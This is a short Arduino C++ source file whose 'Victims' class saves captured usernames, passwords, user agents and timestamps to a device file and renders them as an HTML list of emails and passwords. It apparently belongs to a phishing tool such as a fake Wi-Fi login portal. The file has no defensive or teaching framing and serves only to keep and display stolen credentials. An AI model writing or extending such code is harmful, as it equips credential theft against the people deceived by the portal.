#include <Arduino.h>
#include <ArduinoJson.h>
#include "Arquivomaneger.cpp"
using namespace std;


class Victims {
private:
    Arquivomaneger* arquivo;
    JsonDocument doc;   

public:

    Victims(){
        arquivo = new Arquivomaneger("/victims.txt");
        String victimsFullText = arquivo->readFile();
        deserializeJson(doc, victimsFullText);
    }

    void addVictimJsonText(String jsonText){
        JsonDocument docTemp; 
        deserializeJson(docTemp, jsonText);

        JsonObject victim = doc["victims"].add<JsonObject>();
        
        victim["username"] = docTemp["username"];
        victim["password"] = docTemp["password"];
        victim["useragent"] = docTemp["useragent"];
        victim["datetime"] = docTemp["datetime"];

        String out;
        serializeJson(doc, out);
        arquivo->writeFile(out);
    }


    void addVictim(String user, String pass){
        JsonObject victim = doc["victims"].add<JsonObject>();
        victim["username"] = user;
        victim["password"] = pass;

        String out;
        serializeJson(doc, out);
        arquivo->writeFile(out);
    }

    void clearVictims(){
        doc["victims"].to<JsonArray>();
        arquivo->clearFile();
    }

    String getJsonText(){
        String out;
        serializeJson(doc, out);
        return out;
    }

    String returnFullTextFormatted(){
        string text = "";

        JsonArray victimsJson = doc["victims"].as<JsonArray>();

        for (int i = 0; i < victimsJson.size(); i++){
            string user = victimsJson[i]["username"];
            string pass = victimsJson[i]["password"];

            text += "<li>Email:  <b>" + user + "</b></br>Password:  <b style=color:#ea5455;>" + pass + "</b></li>";            
        }

        return String(text.c_str());
    }
  
};
